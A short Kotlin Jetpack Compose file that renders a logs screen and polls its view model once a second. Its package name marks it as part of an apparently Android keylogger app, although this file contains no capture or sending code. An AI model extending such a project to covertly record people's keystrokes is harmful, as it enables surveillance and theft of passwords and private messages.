package com.bshu2.androidkeylogger.feature.logs

import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import androidx.lifecycle.viewmodel.compose.viewModel
import kotlinx.coroutines.delay

@Composable
fun LogsRoute(vm: LogsViewModel = viewModel()) {
    val lines by vm.lines.collectAsStateWithLifecycle()
    LaunchedEffect(Unit) {
        vm.seed()
        while (true) {
            delay(1000)
            vm.poll()
        }
    }
    LogsScreen(lines = lines)
}
